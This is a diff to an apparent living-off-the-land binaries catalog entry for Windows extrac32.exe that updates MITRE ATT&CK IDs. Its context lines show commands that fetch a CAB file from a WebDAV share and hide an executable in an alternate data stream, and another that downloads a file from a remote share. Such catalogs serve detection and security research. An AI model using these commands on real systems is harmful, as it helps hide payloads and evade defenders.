@@ -9,16 +9,14 @@ Commands:
     Usecase: Extract data from cab file and hide it in an alternate data stream.
     Category: ADS
     Privileges: User
-    MitreID: T1096
-    MitreLink: https://attack.mitre.org/wiki/Technique/T1096
+    MitreID: T1564.004
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
   - Command: extrac32 \\webdavserver\webdav\file.cab c:\ADS\file.txt:file.exe
     Description: Extracts the source CAB file on an unc path into an Alternate Data Stream (ADS) of the target file.
     Usecase: Extract data from cab file and hide it in an alternate data stream.
     Category: ADS
     Privileges: User
-    MitreID: T1096
-    MitreLink: https://attack.mitre.org/wiki/Technique/T1096
+    MitreID: T1564.004
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
   - Command: extrac32 /Y /C \\webdavserver\share\test.txt C:\folder\test.txt
     Description: Copy the source file to the destination file and overwrite it.
@@ -26,7 +24,6 @@ Commands:
     Category: Download
     Privileges: User
     MitreID: T1105
-    MitreLink: https://attack.mitre.org/wiki/Technique/T1105
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
   - Command: extrac32.exe /C C:\Windows\System32\calc.exe C:\Users\user\Desktop\calc.exe
     Description: Command for copying calc.exe to another folder
@@ -34,7 +31,6 @@ Commands:
     Category: Copy
     Privileges: User
     MitreID: T1105
-    MitreLink: https://attack.mitre.org/wiki/Technique/T1105
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
 Full_Path:
   - Path: C:\Windows\System32\extrac32.exe
